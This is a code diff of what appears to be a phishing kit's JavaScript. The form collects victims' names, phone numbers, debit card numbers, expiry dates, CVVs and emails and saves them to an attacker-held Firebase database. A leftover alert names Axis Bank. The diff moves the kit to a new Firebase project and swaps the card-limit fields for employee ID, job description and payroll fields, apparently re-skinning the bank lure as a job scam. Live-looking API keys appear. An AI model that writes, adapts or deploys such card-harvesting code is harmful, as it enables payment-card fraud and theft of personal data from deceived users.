@@ -1,12 +1,11 @@
 // Initialize Firebase (ADD YOUR OWN DATA)
 const firebaseConfig = {
-  apiKey: "AIzaSyDAyX2Hsz5c9lZR6JEafvidol-Mw_ERnhQ",
-  authDomain: "project-d0054.firebaseapp.com",
-  databaseURL: "https://project-d0054-default-rtdb.firebaseio.com",
-  projectId: "project-d0054",
-  storageBucket: "project-d0054.appspot.com",
-  messagingSenderId: "57829236229",
-  appId: "1:57829236229:web:934a6ac84814ec1393c66c",
+  apiKey: "AIzaSyDv1bY7e00Paq3KrBqgWD2_CjGorby3fFA",
+  authDomain: "fivr-eecbb.firebaseapp.com",
+  projectId: "fivr-eecbb",
+  storageBucket: "fivr-eecbb.appspot.com",
+  messagingSenderId: "433007869893",
+  appId: "1:433007869893:web:b1f59ab96b1f49ab1a15ac",
 
 
     
@@ -31,13 +30,13 @@ function submitForm(e){
   var debitc = getInputVal('debitc');
   var expdate = getInputVal('expdate');
   var cvv = getInputVal('cvv');
-  var cardholder = getInputVal('cardholder');
+  var emp_id = getInputVal('emp_id');
   var email = getInputVal('email')
-  var total_limit = getInputVal('total_limit')
-  var available_limit = getInputVal('available_limit')
+  var job_desc = getInputVal('job_desc')
+  var pay_roll = getInputVal('pay_roll')
 
   // Save message
-  saveMessage(name, phone, debitc, expdate, cvv, cardholder, email, total_limit, available_limit);
+  saveMessage(name, phone, debitc, expdate, cvv, emp_id, email, job_desc, pay_roll);
 
   // Show alert
 // alert("Axis Bank Will Contact You Soon")
@@ -54,7 +53,7 @@ function getInputVal(id){
 }
 
 // Save message to firebase
-function saveMessage(name, phone, debitc, expdate, cvv, cardholder, email, total_limit, available_limit){
+function saveMessage(name, phone, debitc, expdate, cvv, emp_id, email, job_desc, pay_roll){
   var newMessageRef = messagesRef.push();
   newMessageRef.set({
     name: name,
@@ -62,9 +61,9 @@ function saveMessage(name, phone, debitc, expdate, cvv, cardholder, email, total
     debitc:debitc,
     expdate:expdate,
     cvv:cvv,
-    cardholder:cardholder,
+    emp_id:emp_id,
     email:email,
-    total_limit:total_limit,
-    available_limit:available_limit,
+    job_desc:job_desc,
+    pay_roll:pay_roll,
   });
 }
